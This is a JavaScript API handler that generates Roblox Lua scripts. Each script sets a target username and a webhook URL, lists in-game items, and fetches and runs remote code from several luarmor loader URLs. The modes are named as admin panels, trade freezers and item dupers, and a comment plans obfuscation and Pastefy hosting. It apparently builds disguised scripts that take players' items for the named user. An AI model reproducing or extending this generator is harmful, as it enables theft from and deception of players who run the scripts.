// api/generate.js
export default async function handler(req, res) {
    // Solo aceptar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;

    // Validar datos mínimos
    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    // Construir el script
    try {
        const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || [], customCode || '');
        
        // Si shortEnabled está activado, ofuscar y subir a Pastefy
        // (por ahora devolvemos el script sin ofuscar)
        return res.status(200).json({ script });
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}

// ============================================================
//  LÓGICA DE GENERACIÓN (copiada de tu frontend)
// ============================================================
function buildScript(username, webhook, mode, brainrots, skins, gears, customCode) {
    // Función para crear tablas Lua
    function luaTable(arr, indent = '    ') {
        if (arr.length === 0) return '{}';
        const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
        return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
    }

    // Construir la configuración base
    let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
    script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;
    script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
    script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
    script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;

    // Loadstrings para modos GUI
    const guiLoadstrings = {
        adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
        freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
        dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
    };

    // Añadir el comentario del modo
    let fullScript = `-- Mode: ${mode.toUpperCase()}\n` + script;

    // Generar los task.spawn según el modo
    if (mode === 'normal') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
    } else if (mode in guiLoadstrings) {
        fullScript += `
task.spawn(function()
    ${guiLoadstrings[mode]}
end)`;
    } else if (mode === 'custom') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
        if (customCode && customCode.trim()) {
            fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
        }
    }

    return fullScript;
}
